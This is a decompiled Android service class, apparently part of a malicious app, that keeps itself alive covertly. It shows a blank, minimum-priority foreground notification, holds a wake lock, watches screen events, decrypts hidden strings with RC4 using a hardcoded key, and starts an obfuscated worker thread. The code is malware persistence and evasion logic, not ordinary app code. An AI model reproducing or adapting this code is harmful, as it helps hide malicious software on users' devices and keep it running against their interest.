package com.example.mmm.Service;

import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.Notification.Builder;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Build.VERSION;
import android.os.PowerManager.WakeLock;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.mainActivity;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.unmapped.Willie;

public class srvAntiSleep extends Service {
   utils utl = new utils();
   constants consts = new constants();
   private boolean bargain$ = false;
   private srvAntiSleep$Receiver length$;
   private WakeLock wakeLock = null;

   @TargetApi(16)
   @TargetApi(16)
   private Notification a() {
      int var1 = VERSION.SDK_INT;
      String var2 = "ENDLESS";
      if (var1 >= 26) {
         NotificationManager var3 = (NotificationManager)this.getSystemService("notification");
         NotificationChannel var4 = new NotificationChannel(var2, " ", 4);
         var4.setDescription("");
         var4.enableLights(true);
         var4.setLightColor(-1);
         var4.enableVibration(false);
         var3.createNotificationChannel(var4);
      }

      PendingIntent var6 = PendingIntent.getActivity(this, 0, new Intent(this, mainActivity.class), 0);
      Builder var5;
      if (VERSION.SDK_INT >= 26) {
         var5 = new Builder(this, var2);
      } else {
         var5 = new Builder(this);
      }

      return var5.setContentTitle("").setContentIntent(var6).setSmallIcon(2130837504).setPriority(-2).build();
   }

   static boolean a(srvAntiSleep var0) {
      return var0.bargain$;
   }

   public final String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   public IBinder onBind(Intent var1) {
      this.utl.Log("EndLess", "Some component want to bind with the service");
      return null;
   }

   public void onCreate() {
      super.onCreate();
      this.utl.Log("EndLess", "The service has been created".toUpperCase());
      this.length$ = new srvAntiSleep$Receiver(this, (byte)0);
      IntentFilter var1 = new IntentFilter();
      var1.addAction("android.intent.action.SCREEN_OFF");
      var1.addAction("android.intent.action.USER_PRESENT");
      this.registerReceiver(this.length$, var1);
      this.startForeground(1, this.a());
   }

   public void onDestroy() {
      super.onDestroy();
      if (this.length$ != null) {
         this.unregisterReceiver(this.length$);
      }

      this.utl.Log("EndLess", "The service has been destroyed".toUpperCase());
   }

   public int onStartCommand(Intent var1, int var2, int var3) {
      utils var4 = this.utl;
      String var5 = "EndLess";
      StringBuilder var6 = new StringBuilder();
      var6.append("onStartCommand executed with startId: ");
      var6.append(var3);
      var4.Log(var5, var6.toString());
      if (var1 != null) {
         if (var1.getAction().equals("start")) {
            if (!this.bargain$) {
               this.utl.Log("EndLess", "Starting the foreground service task");
               this.bargain$ = true;
               this.utl.SettingsWrite(this, "EL", "start");
               if (this.wakeLock == null) {
                  ((PowerManager)this.getSystemService("power")).newWakeLock(1, this.getClass().getName()).acquire();
               }

               (new Thread(new Willie(this))).start();
               return 1;
            }
         } else {
            this.utl.Log("EndLess", "Stopping the foreground service");
            if (this.wakeLock != null && this.wakeLock.isHeld()) {
               this.wakeLock.release();
            }

            this.stopForeground(true);
            this.stopSelf();
            this.bargain$ = false;
            this.utl.SettingsWrite(this, "EL", "");
         }
      }

      return 1;
   }
}
